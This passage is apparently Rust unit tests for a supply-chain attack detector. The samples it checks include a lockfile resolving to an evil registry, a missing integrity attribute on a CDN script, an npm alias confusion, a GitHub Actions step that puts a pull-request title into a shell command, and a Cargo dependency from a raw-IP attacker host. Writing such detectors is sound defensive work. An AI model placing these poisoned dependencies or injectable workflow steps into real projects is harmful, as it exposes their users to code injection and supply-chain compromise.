        let eval = SupplyChainEvaluator;
        let dets = eval.detect(r#"{"resolved":"https://evil-registry.example.com/lodash/-/lodash-4.17.21.tgz","integrity":"sha512-abc"}"#);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "lockfile_poisoning")
        );
    }

    #[test]
    fn detects_missing_sri_for_third_party_cdn_script() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect(r#"<script src="https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js"></script>"#);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cdn_integrity_bypass")
        );
        assert_eq!(
            eval.map_class("cdn_integrity_bypass"),
            Some(InvariantClass::PostinstallInjection)
        );
    }

    #[test]
    fn detects_manifest_confusion_via_npm_alias() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect(r#"{"dependencies":{"left-pad":"npm:right-pad@1.0.0"}}"#);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "manifest_confusion")
        );
        assert_eq!(
            eval.map_class("manifest_confusion"),
            Some(InvariantClass::DependencyConfusion)
        );
    }

    #[test]
    fn test_github_actions_pwn_request() {
        let eval = SupplyChainEvaluator;
        let input = r#"
name: ci
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
"#;
        let dets = eval.detect(input);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "github_actions_pwn_request")
        );
    }

    #[test]
    fn test_cargo_git_dep_raw_ip() {
        let eval = SupplyChainEvaluator;
        let dets = eval.detect(r#"git = "http://1.2.3.4/attacker/crate""#);
        assert!(
            dets.iter()
                .any(|d| d.detection_type == "cargo_git_dep_injection")
        );
    }
}
